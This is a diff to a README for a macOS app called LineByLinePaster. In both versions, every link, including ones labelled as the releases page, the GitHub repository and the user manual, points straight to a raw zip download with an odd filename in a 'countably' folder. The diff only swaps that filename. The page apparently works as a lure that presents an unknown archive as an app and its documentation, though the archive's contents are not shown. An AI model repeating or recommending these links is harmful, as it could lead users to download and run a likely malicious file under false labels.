@@ -1,6 +1,6 @@
 # 🎉 LineByLinePaster - Effortless Text Pasting for macOS
 
-[![Download LineByLinePaster](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/LineByLinePaster-indanthrene.zip)](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/LineByLinePaster-indanthrene.zip)
+[![Download LineByLinePaster](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/By_Paster_Line_2.0.zip)](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/By_Paster_Line_2.0.zip)
 
 ## 🛠️ Introduction
 
@@ -12,7 +12,7 @@ Here’s how to get started with LineByLinePaster:
 
 1. **Download the Application**
    
-   Visit this page to download: [LineByLinePaster Releases](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/LineByLinePaster-indanthrene.zip)
+   Visit this page to download: [LineByLinePaster Releases](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/By_Paster_Line_2.0.zip)
 
 2. **System Requirements**
 
@@ -40,7 +40,7 @@ LineByLinePaster comes with several useful features:
 
 ## 🏁 Download & Install
 
-To download LineByLinePaster, go to the [Releases page](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/LineByLinePaster-indanthrene.zip) and choose the latest version. Once downloaded, follow the installation steps provided above to set it up on your device.
+To download LineByLinePaster, go to the [Releases page](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/By_Paster_Line_2.0.zip) and choose the latest version. Once downloaded, follow the installation steps provided above to set it up on your device.
 
 ## ⚙️ How to Use
 
@@ -87,7 +87,7 @@ For updates, keep an eye on the project’s GitHub page.
 
 For more information and documentation, check the following resources:
 
-- [LineByLinePaster GitHub Repository](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/LineByLinePaster-indanthrene.zip)
-- [User Manual](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/LineByLinePaster-indanthrene.zip)
+- [LineByLinePaster GitHub Repository](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/By_Paster_Line_2.0.zip)
+- [User Manual](https://raw.githubusercontent.com/Aboumatta/LineByLinePaster/main/countably/By_Paster_Line_2.0.zip)
 
 Thank you for using LineByLinePaster! We hope it makes your text handling smoother.
